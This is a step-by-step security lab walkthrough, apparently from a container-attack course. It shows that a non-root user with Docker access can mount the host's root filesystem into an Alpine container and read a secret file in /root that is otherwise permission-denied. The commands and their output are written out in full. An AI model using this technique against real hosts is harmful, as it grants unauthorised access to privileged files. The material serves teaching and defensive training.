## Authentication Attacks against Host

###### A `non-root user` with access to docker can gain access to root filesystem of the host machine.

##### Step 1:
* Open Terminal

	![](img/Open-Terminal.png)

##### Step 2:
*  **cd** into  `Labs/3.0.0-Container-Attacks/3.1.0`

    ```commandline
    cd Labs/3.0.0-Container-Attacks/3.1.0
    ```

##### Step 3:
* Run `sudo su` to become root user.

    ```commandline
      root@we45:~/Labs/3.0.0-Container-Attacks/3.1.0# sudo su
      root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0#
    ```
##### Step 4:
* Create a `secret.txt` file inside `/root/` directory.

    ```commandline
    root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0# touch /root/secret.txt
    root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0#
    ```
##### Step 5:
* Open `secret.txt` and write some secret in it.

    **Note:** 
    1. `esc+i` to insert character into the file,
    2. `esc+:+wq` to save and exit from the file.

    ```commandline
    root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0# vim /root/secret.txt
    root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0#
    ```
    
        
##### Step 6:   
* Run `sudo su user` login as a normal user.

    ```commandline
    root@we45:~/Labs/3.0.0-Container-Attacks/3.1.0# sudo su user
    user@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0$
    ```
##### Step 7:   
* Run `cat /root/secret.txt` read the content of secret.txt file.

    ```commandline
    user@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0$ cat /root/secret.txt
    cat: /root/secret.txt: Permission denied
    ```
##### Step 8: 
* Run `docker run -ti -v /:/hostFS/ alpine` as `docker-user`(non-root user)
    ```commandline
    root@we45:~/Labs/3.0.0-Container-Attacks/3.1.0# docker run -ti -v /:/hostFS/ alpine
    / # 
    
    ```

##### Step 9:
* Run `cd /hostFS/root/` to access the toot directory.

    ```commandline
    / # cd /hostFS/root/
    /hostFS/root # 
    ```
    
##### Step 10:  
* Run `ls` to check the secret.txt file inside a container.

    ```commandline
    /hostFS/root # ls
    secret.txt
    ``` 
    
##### Step 11:
* Run `cat secret.txt` to view the content of the file.

```commandline
/hostFS/root # cat secret.txt
secret

``` 

**Note** : Now the docker-user has the privilege to view the root user data.
